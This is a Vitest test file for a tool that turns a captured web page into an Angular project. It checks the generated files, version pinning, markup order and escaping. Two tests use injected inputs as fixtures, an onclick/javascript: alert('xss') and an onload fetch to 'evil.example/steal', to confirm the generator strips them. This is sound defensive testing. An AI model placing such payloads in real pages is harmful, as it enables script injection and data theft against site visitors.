import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type {
  CapturedElementNode,
  CapturedPage,
  CapturedStyles,
  CapturedTextNode,
} from '../../capture/ir/captured-page.interface.js';
import { generateAngularProject } from './angular-generator.js';

let nextTestId = 0;
function nextId(): string {
  const id = `n${nextTestId}`;
  nextTestId += 1;
  return id;
}

function styles(overrides: Partial<CapturedStyles> = {}): CapturedStyles {
  const base: CapturedStyles = {
    display: 'block',
    position: 'static',
    boxSizing: 'content-box',
    top: 'auto',
    right: 'auto',
    bottom: 'auto',
    left: 'auto',
    width: 'auto',
    height: 'auto',
    minWidth: 'auto',
    minHeight: 'auto',
    maxWidth: 'none',
    maxHeight: 'none',
    margin: '0px',
    padding: '0px',
    color: 'rgb(0, 0, 0)',
    background: 'rgba(0, 0, 0, 0)',
    backgroundColor: 'rgba(0, 0, 0, 0)',
    fontFamily: 'Arial',
    fontSize: '16px',
    fontWeight: '400',
    fontStyle: 'normal',
    lineHeight: 'normal',
    letterSpacing: 'normal',
    textAlign: 'start',
    textDecoration: 'none solid rgb(0, 0, 0)',
    borderTop: '0px none rgb(0, 0, 0)',
    borderRight: '0px none rgb(0, 0, 0)',
    borderBottom: '0px none rgb(0, 0, 0)',
    borderLeft: '0px none rgb(0, 0, 0)',
    borderRadius: '0px',
    boxShadow: 'none',
    opacity: '1',
    overflow: 'visible',
    listStyle: 'disc outside none',
    flexDirection: 'row',
    flexWrap: 'nowrap',
    alignItems: 'normal',
    justifyContent: 'normal',
    gap: 'normal',
    gridTemplateColumns: 'none',
    gridTemplateRows: 'none',
    transform: 'none',
    zIndex: 'auto',
  };
  return { ...base, ...overrides };
}

function element(
  tag: string,
  options: {
    attributes?: Record<string, string>;
    children?: (CapturedElementNode | CapturedTextNode)[];
    styleOverrides?: Partial<CapturedStyles>;
  } = {},
): CapturedElementNode {
  return {
    kind: 'element',
    id: nextId(),
    tag,
    attributes: options.attributes ?? {},
    rect: { x: 0, y: 0, width: 0, height: 0, top: 0, left: 0, right: 0, bottom: 0 },
    styles: styles(options.styleOverrides),
    children: options.children ?? [],
  };
}

function text(value: string): CapturedTextNode {
  return { kind: 'text', id: nextId(), text: value };
}

function page(root: CapturedElementNode | null, title = 'Sample'): CapturedPage {
  return {
    url: 'https://example.com',
    title,
    viewport: { width: 1440, height: 900 },
    root,
    assets: [],
    nodeCount: 0,
  };
}

describe('generateAngularProject', () => {
  let outputDir: string;

  beforeEach(async () => {
    outputDir = await fs.mkdtemp(path.join(os.tmpdir(), 'dg-angular-gen-'));
  });

  afterEach(async () => {
    await fs.rm(outputDir, { recursive: true, force: true });
  });

  it('writes every required project file under the given output directory', async () => {
    const result = await generateAngularProject(page(element('body')), outputDir);

    const expectedFiles = [
      'package.json',
      'angular.json',
      'tsconfig.json',
      'tsconfig.app.json',
      'src/index.html',
      'src/main.ts',
      'src/styles.scss',
      'src/app/app.ts',
      'src/app/app.html',
      'src/app/app.scss',
    ];

    expect(result.rootDir).toBe(outputDir);
    expect(result.files.sort()).toEqual(expectedFiles.sort());

    for (const relativePath of expectedFiles) {
      const stat = await fs.stat(path.join(outputDir, relativePath));
      expect(stat.isFile()).toBe(true);
    }
  });

  it('writes files correctly into a deeply nested, not-yet-existing output directory', async () => {
    const nestedDir = path.join(outputDir, 'a', 'b', 'c');
    const result = await generateAngularProject(page(element('body')), nestedDir);

    expect(result.rootDir).toBe(nestedDir);
    const packageJsonPath = path.join(nestedDir, 'package.json');
    await expect(fs.readFile(packageJsonPath, 'utf-8')).resolves.toContain('"private": true');
  });

  it('generates a package.json that is valid JSON with exact (non-range) versions', async () => {
    await generateAngularProject(page(element('body')), outputDir, {
      projectName: 'my-clone',
    });

    const raw = await fs.readFile(path.join(outputDir, 'package.json'), 'utf-8');
    const parsed = JSON.parse(raw);

    expect(parsed.name).toBe('my-clone');
    expect(parsed.private).toBe(true);
    expect(parsed.dependencies['@angular/core']).toMatch(/^\d+\.\d+\.\d+$/);
    expect(parsed.devDependencies['@angular/cli']).toMatch(/^\d+\.\d+\.\d+$/);
    // No caret/tilde ranges and no "latest" anywhere in the file.
    expect(raw).not.toContain('^');
    expect(raw).not.toContain('~');
    expect(raw).not.toContain('latest');
  });

  it('generates an angular.json that is valid JSON and wires the project name through', async () => {
    await generateAngularProject(page(element('body')), outputDir, {
      projectName: 'my-clone',
    });

    const raw = await fs.readFile(path.join(outputDir, 'angular.json'), 'utf-8');
    const parsed = JSON.parse(raw);

    expect(parsed.projects['my-clone'].projectType).toBe('application');
    expect(parsed.projects['my-clone'].architect.build.builder).toBe(
      '@angular/build:application',
    );
    expect(parsed.projects['my-clone'].architect.build.options.browser).toBe('src/main.ts');
  });

  it('generates a structurally valid standalone app.ts', async () => {
    await generateAngularProject(page(element('body')), outputDir);

    const appTs = await fs.readFile(path.join(outputDir, 'src/app/app.ts'), 'utf-8');

    expect(appTs).toContain("import { Component, ViewEncapsulation } from '@angular/core';");
    expect(appTs).toContain('@Component({');
    expect(appTs).toContain("selector: 'app-root'");
    expect(appTs).toContain("templateUrl: './app.html'");
    expect(appTs).toContain("styleUrl: './app.scss'");
    expect(appTs).toContain('encapsulation: ViewEncapsulation.None');
    expect(appTs).toContain('export class App {}');
    // No Router/HttpClient/services — none are needed for a static page.
    expect(appTs).not.toContain('Router');
    expect(appTs).not.toContain('HttpClient');
  });

  it('applies the root node id to the app-root host, not as a nested <body> tag', async () => {
    const root = element('body', { children: [element('div')] });
    await generateAngularProject(page(root), outputDir);

    const appTs = await fs.readFile(path.join(outputDir, 'src/app/app.ts'), 'utf-8');
    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');

    expect(appTs).toContain(`id: 'dg-${root.id}'`);
    expect(appHtml).not.toContain('<body');
  });

  it('renders app.html with the expected element hierarchy', async () => {
    const span = element('span', { children: [text('World')] });
    const root = element('body', {
      children: [element('div', { children: [element('h1', { children: [span] })] })],
    });
    await generateAngularProject(page(root), outputDir);

    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');
    const div = root.children[0] as ReturnType<typeof element>;
    const h1 = div.children[0] as ReturnType<typeof element>;

    expect(appHtml).toContain(
      `<div id="dg-${div.id}"><h1 id="dg-${h1.id}"><span id="dg-${span.id}">World</span></h1></div>`,
    );
  });

  it('preserves exact DOM order for interleaved text and elements (TextNodes keep order)', async () => {
    const strong = element('strong', { children: [text('Jaret')] });
    const root = element('body', {
      children: [
        element('p', { children: [text('Hello '), strong, text(', welcome back.')] }),
      ],
    });
    await generateAngularProject(page(root), outputDir);

    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');
    const p = root.children[0] as ReturnType<typeof element>;

    expect(appHtml).toContain(
      `<p id="dg-${p.id}">Hello <strong id="dg-${strong.id}">Jaret</strong>, welcome back.</p>`,
    );
  });

  it('neutralizes literal {{ }} in captured text so Angular does not read it as interpolation', async () => {
    const root = element('body', { children: [text('Use {{ handlebars }} syntax')] });
    await generateAngularProject(page(root), outputDir);

    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');

    expect(appHtml).not.toContain('{{');
    expect(appHtml).not.toContain('}}');
    expect(appHtml).toContain('&#123;&#123; handlebars &#125;&#125;');
  });

  it('preserves inline SVG geometry and presentation attributes', async () => {
    const circle = element('circle', {
      attributes: { cx: '10', cy: '10', r: '10', fill: 'rgb(34,197,94)' },
    });
    const svg = element('svg', {
      attributes: { viewBox: '0 0 20 20', width: '16', height: '16' },
      children: [circle],
    });
    await generateAngularProject(page(element('body', { children: [svg] })), outputDir);

    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');

    expect(appHtml).toContain('viewBox="0 0 20 20"');
    expect(appHtml).toContain('cx="10" cy="10" r="10" fill="rgb(34,197,94)"');
  });

  it('strips dangerous attributes: original id/class/style, on* handlers, javascript: URLs', async () => {
    const root = element('body', {
      children: [
        element('a', {
          attributes: {
            id: 'original-id',
            class: 'original-class',
            style: 'color: red;',
            onclick: "alert('xss')",
            href: "javascript:alert('xss')",
          },
        }),
      ],
    });
    await generateAngularProject(page(root), outputDir);

    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');

    expect(appHtml).not.toContain('original-id');
    expect(appHtml).not.toContain('original-class');
    expect(appHtml).not.toContain('style=');
    expect(appHtml).not.toContain('onclick');
    expect(appHtml).not.toContain('javascript:');
  });

  it('never carries over the original <script> content from the source page', async () => {
    // The extractor already drops <script> tags entirely (Milestone 1), but
    // this asserts the generator doesn't reintroduce executable original JS
    // through some other path (e.g. an inline event handler left in place).
    const root = element('body', {
      attributes: { onload: "fetch('https://evil.example/steal')" },
    });
    await generateAngularProject(page(root), outputDir);

    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');
    const appTs = await fs.readFile(path.join(outputDir, 'src/app/app.ts'), 'utf-8');

    expect(appHtml).not.toContain('evil.example');
    expect(appTs).not.toContain('evil.example');
  });

  it('writes app.scss with one #dg-<id> selector per node, matching StaticRenderer', async () => {
    const child = element('div', { styleOverrides: { backgroundColor: 'rgb(255, 0, 0)' } });
    const root = element('body', { children: [child] });
    await generateAngularProject(page(root), outputDir);

    const appScss = await fs.readFile(path.join(outputDir, 'src/app/app.scss'), 'utf-8');

    // Doppelganger styles by id, not by class (see static-renderer.ts) — this
    // asserts the dg-* *selectors* the milestone refers to, i.e. #dg-n0.
    expect(appScss).toContain(`#dg-${root.id} {`);
    expect(appScss).toContain(`#dg-${child.id} {`);
    expect(appScss).toContain('background-color: rgb(255, 0, 0);');
  });

  it('handles a page with no root gracefully', async () => {
    const result = await generateAngularProject(page(null), outputDir);
    expect(result.files).toContain('src/app/app.html');

    const appHtml = await fs.readFile(path.join(outputDir, 'src/app/app.html'), 'utf-8');
    const appTs = await fs.readFile(path.join(outputDir, 'src/app/app.ts'), 'utf-8');
    expect(appHtml.trim()).toBe('');
    expect(appTs).not.toContain('host:');
  });
});
